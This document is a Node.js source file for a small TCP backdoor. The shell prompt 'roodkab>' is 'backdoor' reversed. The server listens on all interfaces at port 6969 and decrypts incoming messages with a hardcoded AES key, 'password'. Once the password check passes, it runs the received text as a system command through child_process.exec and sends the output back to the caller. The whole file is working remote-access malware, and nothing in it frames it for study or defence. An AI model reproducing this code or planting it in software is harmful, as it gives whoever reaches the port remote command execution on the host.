var net = require('net');
var exec = require('child_process').exec;
var HOST = '0.0.0.0';
var PORT = 6969;
var PS1 = "roodkab> ";

var crypto = require('crypto'),
    algorithm = 'aes-256-ctr',
    password = 'password';

function encrypt(text) {
    var cipher = crypto.createCipher(algorithm,password);
    var crypted = cipher.update(text, 'utf8', 'hex');
    crypted += cipher.final('hex');
    return crypted;
}

function decrypt(text) {
    var decipher = crypto.createDecipher(algorithm,password);
    var dec = decipher.update(text,'hex','utf8');
    dec += decipher.final('utf8');
    return dec;
}

function check_password(text){
    text = text.toString("utf-8");
    var array = text.split("|;");
    if (array.length == 2)
	if (array[0] == password)
	    return (array[1])
    return (null)
}

net.createServer(function(sock) {
    sock.write(PS1);
    sock.on('data', function(data) {
	data = check_password(decrypt(data.toString('utf-8')));
	if (data == null)
	    sock.write("wrong password");
	else
	    exec(data, function(error, stdout, stderr) {
		if (stdout != null && stdout.length > 0)
		    sock.write(stdout);
		if (stderr != null && stderr.length > 0)
		    sock.write(stderr);
		if (error != null && error.length > 0)
		    sock.write(error);
	    sock.write(PS1);
	    });
    });
}).listen(PORT, HOST);

console.log('Server listening on ' + HOST +':'+ PORT);
